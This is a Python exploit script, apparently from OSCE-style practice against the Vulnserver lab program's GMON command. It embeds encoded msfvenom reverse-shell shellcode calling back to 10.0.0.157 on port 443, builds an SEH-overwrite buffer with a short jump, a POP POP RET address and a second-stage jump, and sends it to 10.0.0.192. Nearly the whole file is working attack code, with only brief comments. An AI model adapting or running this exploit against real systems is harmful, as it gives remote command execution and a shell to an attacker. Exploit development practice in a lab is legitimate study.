#!/usr/bin/python3

import socket

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=10.0.0.157 LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -i 3 -b "\x00" -f python

buf =  b""
buf += b"\xba\x45\xad\x32\x05\xd9\xca\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x5f\x31\x56\x14\x03\x56\x14\x83\xee\xfc\xa7"
buf += b"\x58\xe9\xdf\x9f\x64\xd1\xa9\xb8\xb3\x9a\x0d\xb2\x1a"
buf += b"\x50\x87\x8b\xfb\xa7\x51\xf1\x78\x01\x59\x06\x39\x98"
buf += b"\x80\x3a\xa1\xf8\xd4\x15\xa6\x85\x4f\xff\x7c\x9b\xb8"
buf += b"\x88\x72\x32\xe0\xa3\x58\xfd\xd8\xa3\xd3\x1b\xe6\x73"
buf += b"\x26\x4c\xc0\xaf\x77\x1f\xb0\xe3\x8f\xf5\x86\x22\xb8"
buf += b"\x48\x2f\xeb\xd0\x22\xeb\x1e\xfb\x66\x41\x77\x20\x7b"
buf += b"\xd5\xa9\x52\xdf\x4d\xd1\x51\xbd\xde\x7a\x6c\xe2\xcc"
buf += b"\x90\x1a\xb5\x3c\x9c\x57\xa3\x1a\xfe\xc8\xf6\xe4\xe6"
buf += b"\x20\x10\x49\x6b\xb2\x0d\x49\xf8\xd9\x97\x29\xe4\x1d"
buf += b"\xd0\x7b\x2c\x74\xdd\x05\x3a\xa6\xe7\x81\x7d\x30\x9c"
buf += b"\x21\xa5\xab\xaf\x5a\x9d\x66\xc8\xea\xc2\xc7\x14\x1e"
buf += b"\x7e\x6f\xff\x2a\x58\x3b\x23\x3d\x4a\xc4\x72\xa3\xf8"
buf += b"\xff\x60\x4d\x61\xf1\x72\x06\x4f\x4f\xde\x55\xbb\xe5"
buf += b"\xb1\x11\xa5\x35\x9b\xfd\x49\xdf\x25\x5c\x7a\x77\x60"
buf += b"\xf3\x88\x89\x4d\x77\x0e\xd0\x07\xd2\x47\x73\xf6\x4b"
buf += b"\x25\x59\x60\x39\xe1\xab\xf3\x42\x13\xd2\x9f\x29\x14"
buf += b"\xd4\xc2\x3f\x04\x68\x76\xaf\x68\x5e\x69\xf9\xf2\xd1"
buf += b"\x0b\xde\x92\xd5\xb7\x80\x4c\x38\xd6\x47\x04\xc3\x26"
buf += b"\x85\x0c\x4a\x1d\xf3\xaf\xe3\x34\xc3\x2a\x35\xef\x13"
buf += b"\xa5\xe9\xc9\x61\xdc\xaa\x54\x10\x99\x73\x8a\xa0\x5b"
buf += b"\xc5\xaf\x7b\xe2\x34\xa2\xed\x09\xaf\x31\x51\x6d\xa8"
buf += b"\xb3\x06\xf2\x98\x57\x0e\x48\x3b\x6a\x1e\xb9\x68\x77"
buf += b"\xe8\x97\x3f\xd9\x93\xa3\xb6\x6e\xb5\x1f\x0c\xd9\x19"
buf += b"\xed\x39\x49\xc1\xa9\xeb\x3d\xcf\xfe\x3d\xe5\xf2\xdc"
buf += b"\xca\xbb\xec\xf1\x35\xd1\xa4\x01\x99\x5d\xd0\x68\x43"
buf += b"\xa4\x4c\x04\xee\x95\x3a\xed\xe8\x6b\xdc\x91\x93\xef"
buf += b"\xfe\x61\x8a\xa9\x62\x6a\xd6\x79\x28\x55\xff\xca\xcf"
buf += b"\x96\x56\x35\x1b\x28\x03\x04\xc2\x18\x41\xfc\xd3\x16"
buf += b"\x95\x38\x2d\x1f\x82\x83\x0c\xde\xee\x5b\xdd\x03\x40"
buf += b"\xc4\xbe"

# Second stage shellcode is based on the floating point EIP modification trick shown in the OSCE text, originally written by Aaron Adams
# You done fucked up, A-A-ron.

stage2 = b"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1"

buffer = b"\x90" * (3514 - 10 - len(buf))
buffer += buf
buffer += b"\x90" * 10 # Some extra NOPs make me feel better even if I have been accurate otherwise.
buffer += b"\xEB\x06\x90\x90\xB4\x10\x50\x62" # short jmp and then SEH overwrite address to POP POP RET in essfunc.dll
buffer += b"\x90" * 5
buffer += stage2
buffer += b"\x90" * (5000 - len(buffer)) # finish out the rest of the buffer

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("10.0.0.192",9999))
banner = s.recv(1024)
print(banner.decode())

exploit = "GMON /.:/ ".encode() + bytearray(buffer) + "\r\n".encode()

s.send(exploit)

response = s.recv(1024)

print(response.decode())

s.close()
